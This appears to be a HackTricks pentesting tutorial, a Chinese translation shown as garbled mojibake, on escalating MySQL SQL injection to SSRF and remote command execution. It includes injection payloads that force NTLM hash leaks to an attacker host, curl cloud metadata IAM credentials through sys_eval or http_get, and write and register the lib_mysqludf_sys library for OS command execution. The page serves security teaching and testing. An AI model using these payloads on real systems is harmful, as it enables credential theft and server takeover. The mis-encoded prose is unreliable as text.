# MySQLæ–‡ä»¶æƒé™åˆ°SSRF/RCE

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricksäº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ æ¨ç‰¹ ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ YouTube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾—**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[NFTæ”¶è—å“**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegramç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* **é€šè¿‡å‘[hacktricksä»“åº“](https://github.com/carlospolop/hacktricks)å’Œ[hacktricks-cloudä»“åº“](https://github.com/carlospolop/hacktricks-cloud)æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§**ã€‚

</details>

**å¸–å­æ¥æºäº**[**https://ibreak.software/2020/06/using-sql-injection-to-perform-ssrf-xspa-attacks/#mysqlmariadbpercona**](https://ibreak.software/2020/06/using-sql-injection-to-perform-ssrf-xspa-attacks/#mysqlmariadbpercona)

### ä½¿ç”¨LOAD\_FILE/LOAD DATA/LOAD XMLè¿›è¡ŒSSRF

æ¯ç¯‡å…³äºSQL Out of Bandæ•°æ®æ³„éœ²çš„æ–‡ç« éƒ½ä¼šä½¿ç”¨`LOAD_FILE()`å­—ç¬¦ä¸²å‡½æ•°è¿›è¡Œç½‘ç»œè¯·æ±‚ã€‚è¯¥å‡½æ•°æœ¬èº«æ ¹æ®è¿è¡Œçš„æ“ä½œç³»ç»Ÿå’Œæ•°æ®åº“å¯åŠ¨æ—¶çš„è®¾ç½®æœ‰å…¶è‡ªèº«çš„é™åˆ¶ã€‚

ä¾‹å¦‚ï¼Œå¦‚æœæœªè®¾ç½®`secure_file_priv`å…¨å±€å˜é‡ï¼Œåˆ™[é»˜è®¤å€¼è®¾ç½®ä¸º`/var/lib/mysql-files/`](https://dev.mysql.com/doc/mysql-installation-excerpt/5.7/en/linux-installation-rpm.html)ï¼Œè¿™æ„å‘³ç€æ‚¨åªèƒ½ä½¿ç”¨ç±»ä¼¼`LOAD_FILE('filename')`æˆ–`LOAD DATA [LOCAL] INFILE 'filename' INTO TABLE tablename`çš„å‡½æ•°ä»`/var/lib/mysql-files/`ç›®å½•ä¸­è¯»å–æ–‡ä»¶ã€‚è¦èƒ½å¤Ÿåœ¨æ­¤ç›®å½•ä¹‹å¤–çš„æ–‡ä»¶ä¸Šæ‰§è¡Œè¯»å–æ“ä½œï¼Œå¿…é¡»å°†`secure_file_priv`é€‰é¡¹è®¾ç½®ä¸º`""`ï¼Œè¿™åªèƒ½é€šè¿‡æ›´æ–°æ•°æ®åº“é…ç½®æ–‡ä»¶æˆ–å°†`--secure_file_priv=""`ä½œä¸ºå¯åŠ¨å‚æ•°ä¼ é€’ç»™æ•°æ®åº“æœåŠ¡æ¥å®Œæˆã€‚

![](https://ibreak.software/img/using-sql-injection-to-perform-ssrf-xspa-attacks/2.png)

ç„¶è€Œï¼Œåœ¨`secure_file_priv`è®¾ç½®ä¸º`""`çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬åº”è¯¥èƒ½å¤Ÿè¯»å–ç³»ç»Ÿä¸Šçš„å…¶ä»–æ–‡ä»¶ï¼Œå‡è®¾å½“å‰æ•°æ®åº“ç”¨æˆ·çš„`file_priv`è®¾ç½®ä¸º`Y`å¹¶ä¸”å…·æœ‰æ–‡ä»¶è¯»å–æƒé™ã€‚ç„¶è€Œï¼Œèƒ½å¤Ÿä½¿ç”¨è¿™äº›å‡½æ•°è¿›è¡Œç½‘ç»œè°ƒç”¨éå¸¸ä¾èµ–äºæ“ä½œç³»ç»Ÿã€‚ç”±äºè¿™äº›å‡½æ•°ä»…ç”¨äºè¯»å–æ–‡ä»¶ï¼Œå› æ­¤å¯ä»¥è¿›è¡Œçš„å”¯ä¸€ä¸ç½‘ç»œç›¸å…³çš„è°ƒç”¨æ˜¯å¯¹Windowsä¸»æœºä¸Šçš„UNCè·¯å¾„è¿›è¡Œè°ƒç”¨ï¼Œå› ä¸º[Windowsçš„`CreateFileA` APIåœ¨è®¿é—®æ–‡ä»¶æ—¶ç†è§£UNCå‘½åçº¦å®š](https://docs.microsoft.com/en-gb/windows/win32/fileio/naming-a-file)ã€‚

å› æ­¤ï¼Œå¦‚æœç›®æ ‡æ•°æ®åº“è¿è¡Œåœ¨Windowsæœºå™¨ä¸Šï¼Œæ³¨å…¥æŸ¥è¯¢`x'; SELECT LOAD_FILE('\\\\attackerserver.example.com\\a.txt'); -- //`å°†å¯¼è‡´Windowsæœºå™¨å‘é€NTLMv2å“ˆå¸Œå€¼ï¼Œè¯•å›¾ä¸æ”»å‡»è€…æ§åˆ¶çš„`\\attackerserver.example.com`è¿›è¡Œèº«ä»½éªŒè¯ã€‚

è¿™ç§æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ ï¼ˆSSRFï¼‰è™½ç„¶æœ‰ç”¨ï¼Œä½†ä»…é™äºTCPç«¯å£445ã€‚æ‚¨æ— æ³•æ§åˆ¶ç«¯å£å·ï¼Œä½†å¯ä»¥ä»å…·æœ‰å®Œå…¨è¯»å–æƒé™çš„å…±äº«ä¸­è¯»å–ä¿¡æ¯ã€‚æ­¤å¤–ï¼Œæ­£å¦‚æ—©æœŸç ”ç©¶æ‰€ç¤ºï¼Œæ‚¨å¯ä»¥ä½¿ç”¨æ­¤æœ‰é™çš„SSRFåŠŸèƒ½çªƒå–å“ˆå¸Œå¹¶å°†å…¶ä¸­ç»§ä»¥è·å¾—shellï¼Œå› æ­¤å®ƒç»å¯¹æœ‰ç”¨ã€‚

![](https://ibreak.software/img/using-sql-injection-to-perform-ssrf-xspa-attacks/3.png)

### ä½¿ç”¨ç”¨æˆ·å®šä¹‰å‡½æ•°è¿›è¡Œè¿œç¨‹å‘½ä»¤æ‰§è¡Œï¼ˆRCEï¼‰

MySQLæ•°æ®åº“çš„å¦ä¸€ä¸ªå¾ˆé…·çš„æŠ€æœ¯æ˜¯ä½¿ç”¨å¤–éƒ¨åº“æ–‡ä»¶ä¸­çš„ç”¨æˆ·å®šä¹‰å‡½æ•°ï¼ˆUDFï¼‰ï¼Œå¦‚æœè¿™äº›åº“æ–‡ä»¶å­˜åœ¨äºç‰¹å®šä½ç½®æˆ–ç³»ç»Ÿ$PATHä¸­ï¼Œåˆ™å¯ä»¥ä»MySQLä¸­è®¿é—®è¿™äº›å‡½æ•°ã€‚

æ‚¨å¯ä»¥ä½¿ç”¨SQLæ³¨å…¥æ¥**ç¼–å†™ä¸€ä¸ªåŒ…å«å¯ä»¥è¿›è¡Œç½‘ç»œ/HTTPè¯·æ±‚çš„ç”¨æˆ·å®šä¹‰å‡½æ•°çš„åº“ï¼ˆ`.so`æˆ–`.dll`**ï¼Œå…·ä½“å–å†³äºLinuxè¿˜æ˜¯Windowsï¼‰ï¼Œç„¶åé€šè¿‡å…¶ä»–æŸ¥è¯¢è°ƒç”¨è¯¥å‡½æ•°ã€‚

ç„¶è€Œï¼Œè¿™ä¹Ÿæœ‰ä¸€äº›é™åˆ¶ã€‚æ ¹æ®MySQLçš„ç‰ˆæœ¬ï¼ˆå¯ä»¥é€šè¿‡`select @@version`æ¥è¯†åˆ«ï¼‰ï¼Œå¯ä»¥åŠ è½½æ’ä»¶çš„ç›®å½•å—åˆ°é™åˆ¶ã€‚MySQL v5.0.67ä»¥ä¸‹ç‰ˆæœ¬å…è®¸ä»ç³»ç»Ÿè·¯å¾„åŠ è½½åº“æ–‡ä»¶ï¼Œå¦‚æœæœªè®¾ç½®`plugin_dir`å˜é‡ã€‚ç°åœ¨æƒ…å†µå·²ç»æ”¹å˜ï¼Œè¾ƒæ–°ç‰ˆæœ¬çš„**`plugin_dir`**å˜é‡è®¾ç½®ä¸ºç±»ä¼¼äº`/usr/lib/mysql/plugin/`çš„å†…å®¹ï¼Œé€šå¸¸ç”±rootæ‹¥æœ‰ã€‚

åŸºæœ¬ä¸Šï¼Œè¦å°†è‡ªå®šä¹‰åº“åŠ è½½åˆ°MySQLå¹¶é€šè¿‡SQLæ³¨å…¥è°ƒç”¨åŠ è½½çš„åº“ä¸­çš„å‡½æ•°ï¼Œæ‚¨éœ€è¦ï¼š

* é€šè¿‡SQLæ³¨å…¥èƒ½å¤Ÿ**å†™å…¥**`@@plugin_dir`æŒ‡å®šçš„ä½ç½®
* å½“å‰æ•°æ®åº“ç”¨æˆ·åœ¨`mysql.user`ä¸­çš„**`file_priv`**è®¾ç½®ä¸º**`Y`**
* å°†**`secure_file_priv`**è®¾ç½®ä¸º**`""`**ï¼Œä»¥ä¾¿æ‚¨å¯ä»¥ä»ç½‘ç»œæˆ–Webåº”ç”¨ç¨‹åºä¸­çš„æ–‡ä»¶ä¸Šä¼ ç›®å½•ç­‰ä»»æ„ä½ç½®è¯»å–åº“çš„åŸå§‹å­—èŠ‚ã€‚

å‡è®¾æ»¡è¶³äº†ä¸Šè¿°æ¡ä»¶ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨**ä¼ ç»Ÿæ–¹æ³•å°†**[**æµè¡Œçš„MySQL UDF `lib_mysqludf_sys`åº“**](https://github.com/mysqludf/lib\_mysqludf\_sys) **ä¼ è¾“åˆ°æ•°æ®åº“æœåŠ¡å™¨**ã€‚ç„¶åï¼Œæ‚¨å°†èƒ½å¤Ÿä½¿ç”¨ä»¥ä¸‹è¯­æ³•æ‰§è¡Œæ“ä½œç³»ç»Ÿå‘½ä»¤è¯·æ±‚ï¼Œä¾‹å¦‚`cURL`æˆ–`powershell wget`ï¼Œä»¥æ‰§è¡ŒSSRFï¼š

`x'; SELECT sys_eval('curl http://169.254.169.254/latest/meta-data/iam/security-credentials/'); -- //`

æ­¤åº“ä¸­å£°æ˜äº†è®¸å¤šå…¶ä»–å‡½æ•°ï¼Œå¯ä»¥åœ¨[æ­¤å¤„](https://osandamalith.com/2018/02/11/mysql-udf-exploitation/)è¿›è¡Œåˆ†æã€‚å¦‚æœæ‚¨åƒæˆ‘ä¸€æ ·æ‡’ï¼Œå¯ä»¥ä»`/usr/share/metasploit-framework/data/exploits/mysql/`ç›®å½•ä¸­çš„metasploitå®‰è£…ä¸­è·å–æ­¤UDFåº“çš„å‰¯æœ¬ï¼Œå¹¶å¼€å§‹ä½¿ç”¨ã€‚
å¦å¤–ï¼Œå·²ç»åˆ›å»ºäº†UDFåº“ï¼Œä¸“é—¨ä¸ºæ•°æ®åº“æä¾›è¿›è¡ŒHTTPè¯·æ±‚çš„èƒ½åŠ›ã€‚æ‚¨å¯ä»¥ä½¿ç”¨[MySQLç”¨æˆ·å®šä¹‰å‡½æ•°ï¼ˆUDFï¼‰è¿›è¡ŒHTTP GET/POST](https://github.com/y-ken/mysql-udf-http)æ¥ä½¿æ•°æ®åº“è¿›è¡ŒHTTPè¯·æ±‚ï¼Œä½¿ç”¨ä»¥ä¸‹è¯­æ³•ï¼š

`x'; SELECT http_get('http://169.254.169.254/latest/meta-data/iam/security-credentials/'); -- //`

æ‚¨è¿˜å¯ä»¥[åˆ›å»ºè‡ªå·±çš„UDFï¼Œå¹¶åœ¨æ¸—é€æµ‹è¯•åä½¿ç”¨å®ƒã€‚](https://pure.security/simple-mysql-backdoor-using-user-defined-functions/)

æ— è®ºå¦‚ä½•ï¼Œæ‚¨éœ€è¦å°†åº“ä¼ è¾“åˆ°æ•°æ®åº“æœåŠ¡å™¨ã€‚æ‚¨å¯ä»¥é€šè¿‡å¤šç§æ–¹å¼å®Œæˆæ­¤æ“ä½œï¼š

1. ä½¿ç”¨MySQLçš„`hex()`å­—ç¬¦ä¸²å‡½æ•°æˆ–ç±»ä¼¼çš„`xxd -p filename.so | tr -d '\n'`å°†åº“çš„å†…å®¹è½¬æ¢ä¸ºåå…­è¿›åˆ¶æ ¼å¼ï¼Œç„¶åä½¿ç”¨`x'; SELECT unhex(0x1234abcd12abcdef1223.....) into dumpfile '/usr/lib/mysql/plugin/lib_mysqludf_sys.so' -- //`å°†å…¶è½¬å‚¨åˆ°`@@plugin_dir`ç›®å½•ä¸­ã€‚
2. æˆ–è€…ï¼Œå°†`filename.so`çš„å†…å®¹è½¬æ¢ä¸ºBase64ï¼Œå¹¶ä½¿ç”¨`x';select from_base64("AAAABB....") into dumpfile '/usr/lib/mysql/plugin/lib_mysqludf_sys.so' -- //`ã€‚

å¦‚æœ`@@plugin_dir`ä¸å¯å†™ï¼Œåˆ™å¦‚æœç‰ˆæœ¬é«˜äº`v5.0.67`ï¼Œæ‚¨å°†æ— æ³•æˆåŠŸã€‚å¦åˆ™ï¼Œå°†å…¶å†™å…¥è·¯å¾„ä¸­çš„å…¶ä»–ä½ç½®ï¼Œå¹¶ä½¿ç”¨ä»¥ä¸‹æ–¹å¼ä»è¯¥ä½ç½®åŠ è½½UDFåº“ï¼š

* å¯¹äº`lib_mysqludf_sys`åº“ - `x';create function sys_eval returns string soname 'lib_mysqludf_sys.so'; -- //`
* å¯¹äº`mysql-udf-http`åº“ - `x';create function http_get returns string soname 'mysql-udf-http.so'; -- //`

![](https://ibreak.software/img/using-sql-injection-to-perform-ssrf-xspa-attacks/4.png)

![](https://ibreak.software/img/using-sql-injection-to-perform-ssrf-xspa-attacks/5.png)

è¦è‡ªåŠ¨åŒ–æ­¤è¿‡ç¨‹ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨æ”¯æŒ[é€šè¿‡`--udf-inject`é€‰é¡¹ä½¿ç”¨è‡ªå®šä¹‰UDFçš„SQLMap](https://github.com/sqlmapproject/sqlmap/wiki/Usage)ã€‚

å¯¹äºç›²æ³¨SQLæ³¨å…¥ï¼Œæ‚¨å¯ä»¥å°†UDFå‡½æ•°çš„è¾“å‡ºé‡å®šå‘åˆ°ä¸´æ—¶è¡¨ä¸­ï¼Œç„¶åä»é‚£é‡Œè¯»å–æ•°æ®ï¼Œæˆ–è€…ä½¿ç”¨[åµŒå…¥åœ¨`sys_eval`æˆ–`sys_exec` curlå‘½ä»¤ä¸­çš„DNSè¯·æ±‚](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration)ã€‚

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* æ‚¨åœ¨**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæ‚¨æƒ³åœ¨HackTricksä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…æ‚¨æƒ³è·å¾—æœ€æ–°ç‰ˆæœ¬çš„PEASSæˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTrickså—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[NFTæ”¶è—å“**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹PEASSå’ŒHackTricksè¡£ç‰©**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–åœ¨**Twitter**ä¸Š**å…³æ³¨**æˆ‘[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* **é€šè¿‡å‘[hacktricks repo](https://github.com/carlospolop/hacktricks)å’Œ[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§**ã€‚

</details>
